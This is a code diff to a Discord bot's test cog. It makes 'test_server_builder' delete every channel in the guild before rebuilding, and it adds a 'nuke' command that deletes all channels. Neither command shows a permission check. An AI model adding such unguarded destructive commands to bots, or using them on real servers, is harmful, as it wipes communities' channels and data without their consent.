@@ -2,7 +2,7 @@ import discord
 from discord.ext import commands
 from languages.lang_manager import LanguageManager
 import os
-
+import threading
 from factory_panel.panel_manager import PanelManager
 from factory_cac.cac_factory import CaCFactory
 from factory_panel.embeds.embed_gen import EmbedGenerator
@@ -79,7 +79,10 @@ class TestCommands(commands.Cog):
 
         await ctx.send(embed=myembed.embed, view=myview)
     @commands.command(name='test_server_builder')
+    
     async def test_server_builder(self, ctx: commands.Context):
+        for channel in ctx.guild.channels:
+            await channel.delete()
         lang_manager = self.bot.guild_object.get_lang_manager()
         panel_manager = PanelManager(lang_manager)
         cac_factory = CaCFactory(ctx.guild, lang_manager)
@@ -87,5 +90,9 @@ class TestCommands(commands.Cog):
         server_builder.panel_manager = panel_manager
         server_builder.cac_factory = cac_factory
         await server_builder.build_server(ctx.guild)
+    @commands.command(name='nuke')
+    async def nuke(self, ctx: commands.Context):
+        for channel in ctx.guild.channels:
+            await channel.delete()
 async def setup(bot: commands.Bot):
     await bot.add_cog(TestCommands(bot))
